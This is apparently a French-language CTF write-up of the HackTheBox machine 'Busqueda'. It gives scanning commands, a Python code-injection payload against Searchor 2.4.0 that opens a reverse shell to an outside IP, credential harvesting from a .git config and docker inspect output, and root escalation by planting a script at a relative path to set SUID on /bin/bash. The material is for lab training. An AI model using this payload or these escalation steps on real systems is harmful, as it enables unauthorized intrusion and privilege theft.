  # Busqueda

	echo "10.10.11.208 searcher.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.208 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 10.10.11.208 -oN nmap.txt
	feroxbuster --silent -u http://10.10.11.208
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http Apache httpd 2.4.52


Il n'y a qu'un dossier "/search" sur le site.

Dans le footer tout en bas, on remarque "Powered by Flask and Searchor 2.4.0"

Voir : https://github.com/jonnyzar/POC-Searchor-2.4.2

Payload :

	', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.57',9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

J'obtiens bien un shell :

	rlwrap nc -nvlp 443
	...
	python3 -c "import pty ; pty.spawn('/bin/bash')"
	cat ~/user.txt
	
### Élévation de privilèges : 

	ls -la
	cat /var/www/app/.git/config
	
On voit une ligne très intéressante : 

> url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git

	echo '10.10.11.208 gitea.searcher.htb' >> /etc/hosts
	ls /home
	cat /etc/passwd
	sudo -l 

Apparemment il n'y a que notre utilisateur sur cette machine, Cody n'a pas de compte dessus. Mais le mot de passe fonctionne : 

> User svc may run the following commands on busqueda:  
> &nbsp;&nbsp;&nbsp;&nbsp; (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

On remarque tout de suite la wildcard. Je ne peux pas accéder au code-source du script mais l'aide est assez explicite. 
</br>Voir également : https://docs.docker.com/engine/reference/commandline/inspect/

	sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
	sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
	sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 
	sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
	
On remarque un morceau très intéressant : 

> GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh

En se reconnectant à http://gitea.searcher.htb mais cette fois en tant qu’administrateur, avec le mot de passe trouvé juste au-dessus, on a accès à toute la partie des scripts. 
</br>Dans le script system-checkup.py on trouve ce morceau de code : 

> elif action == 'full-checkup':
> </br>&nbsp;&nbsp;&nbsp;&nbsp; try:
> </br>&nbsp;&nbsp;&nbsp;&nbsp; arg_list = ['./full-checkup.sh']

Le chemin est relatif. On peut donc se placer dans un dossier accessible en écriture et y mettre notre propre script full-checkup.sh contenant un reverse-shell par exemple. J'ai choisi de faire plus rapide avec le SUID sur /bin/bash vu que c'est une simple VM :  

	cd /tmp
	echo '#!/bin/bash' >> full-checkup.sh
	echo 'chmod 4777 /bin/bash' >> full-checkup.sh
	chmod a+x ./full-checkup.sh
	sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
	...
	/bin/bash -p
	whoami
	cat /root/root.txt


